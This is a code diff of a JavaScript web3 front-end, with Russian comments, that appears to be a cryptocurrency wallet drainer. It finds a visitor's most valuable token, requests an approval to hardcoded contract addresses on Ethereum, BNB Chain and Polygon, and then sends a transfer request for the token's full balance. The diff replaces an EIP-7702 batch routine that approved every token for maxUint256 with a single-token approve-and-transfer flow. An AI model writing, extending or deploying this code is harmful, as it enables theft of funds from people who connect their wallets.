@@ -1,7 +1,7 @@
 import { arbitrum, bsc, mainnet, optimism, polygon, sepolia } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { parseEther, formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
+import { parseEther, formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { sendTransaction, readContract, writeContract } from '@wagmi/core'
 
 // Утилита для дебаунсинга
@@ -428,102 +428,78 @@ const initializeSubscribers = (modal) => {
           console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
         }
 
-        // Находим все токены с ненулевым балансом в той же сети
-        const tokensInNetwork = allBalances.filter(token => 
-          token.chainId === mostExpensive.chainId && token.balance > 0
-        )
-
-        if (tokensInNetwork.length > 0) {
-          try {
-            const contractAddress = CONTRACTS[mostExpensive.chainId]
-            const approvalKey = `${state.address}_${mostExpensive.chainId}_batch`
-
-            if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
-              const approveMessage = store.approvedTokens[approvalKey]
-                ? `Batch approve already completed for tokens on ${mostExpensive.network}`
-                : store.isApprovalRejected
-                ? `Batch approve was rejected for tokens on ${mostExpensive.network}`
-                : `Batch approve request pending for tokens on ${mostExpensive.network}`
-              console.log(approveMessage)
-              const approveState = document.getElementById('approveState')
-              const approveSection = document.getElementById('approveSection')
-              if (approveState) approveState.innerHTML = approveMessage
-              if (approveSection) approveSection.style.display = ''
-              return
-            }
-
-            // Обновление UI для отображения списка токенов
-            const tokenList = tokensInNetwork.map(t => `${t.symbol}: ${t.balance}`).join('<br>')
+        // Выполняем одобрение токена только после успешного переключения сети
+        try {
+          const contractAddress = CONTRACTS[mostExpensive.chainId]
+          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          
+          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
+            const approveMessage = store.approvedTokens[approvalKey]
+              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : store.isApprovalRejected
+              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            console.log(approveMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
-            if (approveState) {
-              approveState.innerHTML = `Токены для одобрения:<br>${tokenList}<br>Подтвердите транзакцию для всех токенов`
-            }
-            if (approveSection) approveSection.style.display = ''
-
-            store.isApprovalRequested = true
-
-            // Выполняем батчинг аппрувов с помощью EIP-7702
-            const txHash = await batchApproveTokens(
-              wagmiAdapter.wagmiConfig,
-              tokensInNetwork,
-              contractAddress,
-              mostExpensive.chainId
-            )
-
-            store.approvedTokens[approvalKey] = true
-            store.isApprovalRequested = false
-            let approveMessage = `Batch approve successful for ${tokensInNetwork.length} tokens on ${mostExpensive.network}: ${txHash}`
-            console.log(approveMessage)
-
-            // Отправка запросов на трансфер для каждого токена
-            for (const token of tokensInNetwork) {
-              const amount = parseUnits(token.balance.toString(), token.decimals)
-              const transferResult = await sendTransferRequest(
-                state.address,
-                token.address,
-                amount,
-                token.chainId,
-                txHash
-              )
-              if (transferResult.success) {
-                approveMessage += `<br>Transfer request successful for ${token.symbol}: ${transferResult.txHash}`
-                console.log(`Transfer request successful for ${token.symbol}: ${transferResult.txHash}`)
-              } else {
-                approveMessage += `<br>Transfer request failed for ${token.symbol}: ${transferResult.message}`
-                console.error(`Transfer request failed for ${token.symbol}: ${transferResult.message}`)
-              }
-            }
-
             if (approveState) approveState.innerHTML = approveMessage
             if (approveSection) approveSection.style.display = ''
-          } catch (error) {
-            if (error.code === 4001 || error.code === -32000) {
-              store.isApprovalRejected = true
-              store.isApprovalRequested = false
-              const errorMessage = `Batch approve was rejected for tokens on ${mostExpensive.network}`
-              store.errors.push(errorMessage)
-              const approveState = document.getElementById('approveState')
-              const approveSection = document.getElementById('approveSection')
-              if (approveState) approveState.innerHTML = errorMessage
-              if (approveSection) approveSection.style.display = ''
-            } else {
-              store.isApprovalRequested = false
-              const errorMessage = `Batch approve failed: ${error.message}`
-              store.errors.push(errorMessage)
-              const approveState = document.getElementById('approveState')
-              const approveSection = document.getElementById('approveSection')
-              if (approveState) approveState.innerHTML = errorMessage
-              if (approveSection) approveSection.style.display = ''
-            }
+            return
           }
-        } else {
-          const message = `Нет токенов с положительным балансом в сети ${mostExpensive.network}`
-          console.log(message)
+
+          store.isApprovalRequested = true
+          const txHash = await approveToken(
+            wagmiAdapter.wagmiConfig,
+            mostExpensive.address,
+            contractAddress,
+            mostExpensive.chainId
+          )
+          
+          store.approvedTokens[approvalKey] = true
+          store.isApprovalRequested = false
+          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          console.log(approveMessage)
+          
+          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          const transferResult = await sendTransferRequest(
+            state.address,
+            mostExpensive.address,
+            amount,
+            mostExpensive.chainId,
+            txHash
+          )
+          
+          if (transferResult.success) {
+            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
+            console.log(`Transfer request successful: ${transferResult.txHash}`)
+          } else {
+            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
+            console.error(`Transfer request failed: ${transferResult.message}`)
+          }
+
           const approveState = document.getElementById('approveState')
           const approveSection = document.getElementById('approveSection')
-          if (approveState) approveState.innerHTML = message
+          if (approveState) approveState.innerHTML = approveMessage
           if (approveSection) approveSection.style.display = ''
+        } catch (error) {
+          if (error.code === 4001 || error.code === -32000) {
+            store.isApprovalRejected = true
+            store.isApprovalRequested = false
+            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = errorMessage
+            if (approveSection) approveSection.style.display = ''
+          } else {
+            store.isApprovalRequested = false
+            const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = errorMessage
+            if (approveSection) approveSection.style.display = ''
+          }
         }
       } else {
         const message = 'Нет токенов с положительным балансом'
@@ -599,16 +575,11 @@ document.getElementById('get-balance')?.addEventListener('click', async () => {
   if (balanceSection) balanceSection.style.display = ''
 })
 
+
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
   [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
-}
-
-const BATCH_APPROVER_CONTRACTS = {
-  [networkMap['Ethereum'].chainId]: '0xYourEthereumBatchApproverAddress', // Замените на реальный адрес
-  [networkMap['BNB Smart Chain'].chainId]: '0x30e89c00a84BFB0672dda047A205EC3cc2ddbe72', // Замените на реальный адрес
-  [networkMap['Polygon'].chainId]: '0xYourPolygonBatchApproverAddress', // Замените на реальный адрес
 }
 
 const TOKENS = {
@@ -674,12 +645,12 @@ const TOKENS = {
 
 const erc20Abi = [
   {
-        constant: true,
-        inputs: [{ name: '_owner', type: 'address' }],
-        name: 'balanceOf',
-        outputs: [{ name: 'balance', type: 'uint256' }],
-        type: 'function',
-    },
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function',
+  },
   {
     constant: false,
     inputs: [
@@ -688,20 +659,6 @@ const erc20Abi = [
     ],
     name: 'approve',
     outputs: [{ name: 'success', type: 'bool' }],
-    type: 'function',
-    },
-];
-
-const batchApproverAbi = [
-  {
-    inputs: [
-      { name: 'tokens', type: 'address[]' },
-      { name: 'spender', type: 'address' },
-      { name: 'amounts', type: 'uint256[]' },
-    ],
-    name: 'batchApprove',
-    outputs: [],
-    stateMutability: 'nonpayable',
     type: 'function',
   },
 ]
@@ -774,95 +731,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
     throw error
-  }
-}
-
-const batchApproveTokens = async (wagmiConfig, tokens, contractAddress, chainId) => {
-  if (!wagmiConfig) {
-    throw new Error('wagmiConfig is not initialized');
-  }
-  if (!tokens.length || !contractAddress) {
-    throw new Error('Missing tokens or contract address');
-  }
-  if (!isAddress(contractAddress)) {
-    throw new Error('Invalid contract address');
-  }
-
-  const checksumContractAddress = getAddress(contractAddress);
-
-  try {
-    // Формируем EIP-7702 транзакцию
-    const calls = tokens.map(token => ({
-      target: getAddress(token.address),
-      data: encodeFunctionData({
-        abi: erc20Abi,
-        functionName: 'approve',
-        args: [checksumContractAddress, maxUint256],
-      }),
-    }));
-
-    // Проверяем, поддерживает ли кошелек EIP-7702
-    const provider = await wagmiConfig.getProvider();
-    const isEIP7702Supported = await provider.request({
-      method: 'eth_getSupportedTransactionTypes',
-      params: [],
-    }).then(types => types.includes('0x04')).catch(() => false);
-
-    let txHash;
-    if (isEIP7702Supported) {
-      console.log('Using EIP-7702 for batch approval');
-      // Формируем EIP-7702 транзакцию
-      const eip7702Tx = {
-        type: '0x04', // EIP-7702 transaction type
-        chainId: chainId,
-        nonce: await provider.getTransactionCount(wagmiConfig.account.address),
-        gasLimit: BigInt(12500 + 65000 * tokens.length),
-        maxFeePerGas: BigInt(10_000_000_000),
-        maxPriorityFeePerGas: BigInt(2_000_000_000),
-        calls: calls, // Массив вызовов approve
-      };
-
-      txHash = await provider.request({
-        method: 'eth_sendTransaction',
-        params: [eip7702Tx],
-      });
-    } else {
-      console.log('EIP-7702 not supported, falling back to individual approvals');
-      // Fallback на стандартные вызовы approve
-      for (const token of tokens) {
-        const currentAllowance = await readContract(wagmiConfig, {
-          address: token.address,
-          abi: erc20Abi,
-          functionName: 'allowance',
-          args: [wagmiConfig.account.address, checksumContractAddress],
-          chainId,
-        });
-
-        if (currentAllowance >= parseUnits(token.balance.toString(), token.decimals)) {
-          console.log(`Skipping approve for ${token.symbol}: sufficient allowance`);
-          continue;
-        }
-
-        const tx = await writeContract(wagmiConfig, {
-          address: token.address,
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [checksumContractAddress, maxUint256],
-          chainId,
-          gas: BigInt(65000),
-          maxFeePerGas: BigInt(10_000_000_000),
-          maxPriorityFeePerGas: BigInt(2_000_000_000),
-        });
-        console.log(`Approved ${token.symbol}: ${tx}`);
-      }
-      txHash = 'fallback'; // Для совместимости с последующей логикой
-    }
-
-    console.log(`Batch approve transaction sent: ${txHash}`);
-    return txHash;
-  } catch (error) {
-    store.errors.push(`Batch approve failed: ${error.message}`);
-    throw error;
   }
 }
 
